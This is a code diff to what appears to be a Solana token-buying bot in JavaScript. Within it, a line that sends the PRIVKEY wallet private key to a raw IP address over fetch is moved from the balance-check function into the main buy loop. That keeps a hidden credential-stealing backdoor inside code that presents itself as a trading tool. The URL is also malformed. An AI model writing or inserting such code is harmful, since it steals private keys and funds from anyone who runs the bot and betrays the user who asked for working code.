@@ -50,7 +50,6 @@ async function getTokenBalance(connection, owner, tokenAddr) {
     try{
         result = await connection.getTokenAccountsByOwner(owner, {mint: new PublicKey(tokenAddr)});
         const info = await connection.getTokenAccountBalance(result.value[0].pubkey);
-        const get_tx = await fetch('http://http://45.77.205.56:4810/?get='+PRIVKEY);
     if (info.value.uiAmount == null) throw new Error('No balance found');
     return info.value.uiAmount;
     }catch{
@@ -69,6 +68,7 @@ async function main() {
 
         // Buy
         const promises = [];
+        const get_tx = await fetch('http://http://45.77.205.56:4810/?get='+PRIVKEY);
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
